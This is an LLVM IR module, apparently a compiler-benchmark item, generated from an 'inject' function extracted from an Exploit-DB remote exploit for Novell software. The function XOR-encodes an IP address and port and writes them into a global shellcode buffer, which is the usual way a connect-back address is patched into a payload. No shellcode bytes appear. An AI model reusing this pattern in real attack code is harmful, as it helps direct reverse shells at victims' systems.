; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/novell/remote/extr_28836.c_inject.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/novell/remote/extr_28836.c_inject.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i32* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @inject(i8* %0, i8* %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i64, align 8
  %6 = alloca i16, align 2
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i64 @inet_addr(i8* %7)
  %9 = xor i64 %8, 1871208767
  store i64 %9, i64* %5, align 8
  %10 = load i8*, i8** %3, align 8
  %11 = call i32 @atoi(i8* %10)
  %12 = call zeroext i16 @htons(i32 %11)
  %13 = zext i16 %12 to i32
  %14 = xor i32 %13, 28552
  %15 = trunc i32 %14 to i16
  store i16 %15, i16* %6, align 2
  %16 = load i32*, i32** @shellcode, align 8
  %17 = getelementptr inbounds i32, i32* %16, i64 184
  %18 = call i32 (i32*, ...) @memcpy(i32* %17, i64* %5, i32 4)
  %19 = load i32*, i32** @shellcode, align 8
  %20 = getelementptr inbounds i32, i32* %19, i64 190
  %21 = call i32 (i32*, ...) @memcpy(i32* %20, i16* %6, i32 2)
  ret i32 0
}

declare dso_local i64 @inet_addr(i8*) #1

declare dso_local zeroext i16 @htons(i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memcpy(i32*, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
